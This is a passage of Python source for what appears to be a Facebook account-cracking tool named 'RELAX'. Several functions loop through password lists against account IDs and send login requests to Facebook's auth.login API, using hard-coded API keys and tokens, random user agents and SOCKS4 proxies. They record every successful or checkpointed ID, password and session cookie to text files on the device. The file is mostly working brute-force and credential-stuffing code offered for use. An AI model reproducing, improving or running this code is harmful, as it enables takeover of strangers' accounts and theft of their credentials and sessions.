...
░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░▒▒ ░ ░▓ ░
  ░▒ ░ ▒░ ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░░░   ░▒ ░
  ░░   ░    ░     ░ ░    ░   ▒    ░    ░  
   ░        ░  ░    ░  ░     ░  ░ ░    ░     \033[1;36m[\x1b[38;5;47mBABY0.1\033[1;36m]
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}RELAX-M1\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[38;5;166m[RELAX-CP] {idf} | {pw}')
                print("\x1b[38;5;46m[🥴] Cookie : "+str(kuki))
                open('/sdcard/RELAX/RELAX-CP.txt','a').write(idf+'|'+pw+'\n')
                cp+=1
                break
                ...
                print(f'\r\x1b[1;32m[RELAX-OK] {str(idf)} | {str(pw)} ')
                print("\x1b[38;5;46m[🥴] Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/RELAX-M1-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/RELAX-M1-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}RELAX-M2\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ua = random.choice(ugen5)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                linex()
                open('/sdcard/noob/RELAX-M2-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/RELAX-M2-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
...
def creakup(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}RELAX-M3\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "session_key" in po:
                ...
                print("\x1b[38;5;46m[🥴]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/RELAX-M3-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/RELAX-M3-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
...
def creakbst(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}RELAX-M4\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    hini = str(random.randint(20000, 40000))
    ...
    for pw in pwv:
        try:
            ...
            if "session_key" in po:
                ...
                print("\x1b[38;5;46m[🥴]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/RELAX-M4-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/RELAX-M4-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\x1b[38;5;166m[RELAX-CP] {idf} | {pw}')
                open('/sdcard/RELAX/RELAX-CP.txt','a').write(idf+'|'+pw+'\n')
...
def creaksexy(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}RELAX-M5\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{ok}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;33m{'{:.1%}'.format(loop/float(len(id)))}\x1b[38;5;160m]\x1b[38;5;46m"),
    sys.stdout.flush()
    ua = random.choice(ugen5)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    ...
    'Accept-Language': 'en-GB,en;q=0.9,fa-IN;q=0.8,fa;q=0.7,hi-IN;q=0.6,hi;q=0.5,bn-BD;q=0.4,bn;q=0.3,en-US;q=0.2'}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print("\x1b[38;5;46m[🥴]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/RELAX-M5-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/RELAX-M5-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
    ...
    for pw in pwv:
        try:
            ...
            if "session_key" in po:
                ...
                print("\x1b[38;5;46m[🥴]\x1b[38;5;46m Cookie : "+str(kuki))
                linex()
                open('/sdcard/noob/RELAX-M6-OK.txt','a').write(idf+'|'+pw+'\n')
                open('/sdcard/noob/RELAX-M6-OK-COOKIE.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\x1b[38;5;166m[RELAX-CP] {idf} | {pw}')
                open('/sdcard/RELAX/RELAX-CP.txt','a').write(idf+'|'+pw+'\n')
...
def randome(idf,pwv,tl):
    ...
    ses = requests.Session()
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}RELAX-XD\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46m{tl}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{str(len(oks))}\x1b[38;5;160m]");sys.stdout.flush()
    try:
        for pw in pwv:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
           ...
           ##### if res == 'LOCK':
            #######	print(f'\r\r{A}[{S}TARIN-LK{A}]{S} {uid} {A}|{S} {pas}');break
               ...
               open('/sdcard/RELAX/RANDOM-CP.txt', 'a').write(str(uid)+'|'+str(pw)+'\n')
               cps.append(str(uid))
               break    
            else:
                continue
    ...
    try:
        for pw in pwv:
            ...
            with requests.Session() as sess:
              data = {'adid': adid,'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': idf,'password': pw,'method': 'auth.login','generate_analytics_claim':'1','community_id':'','cpl':'true','try_num':'1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ..oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3','fb4a_shared_phone_cpl_group':'enable_v3_at_risk','enroll_misauth':'false','generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'account_recovery','generate_machine_id':'1','jazoest':'2980','meta_inf_fbmeta':'V2_UNTAGGED','encrypted_msisdn':'','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'autheticate','fb_api_caller_class':'Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895','sig':'4c854da0db9429f4913c2a1b221c1d30'}
              head = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            ...
            ###	if"ok"==lo_ck(idf):
              ...
              ###  if "LIVE" in response:
                ...
                linex()
                open('/sdcard/RELAX/RANDOM-OK.txt', 'a').write(str(idf)+'|'+str(pw)+'|'+str(coki)+'\n')
                oks.append(str(idf))
                break                            	
            elif 'www.facebook.com' in po['error']['message']:
                ...
                response = str(requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal").text)
                if "LIVE" in response:
                               print(f'\r\x1b[1;91m[RELAX-CP] {str(idf)} | {str(pw)} ')
                               open('/sdcard/RELAX/RANDOM-CP.txt', 'a').write(str(idf)+'|'+str(pw)+'\n')
                               cps.append(str(idf))
                               break
            else:
                continue
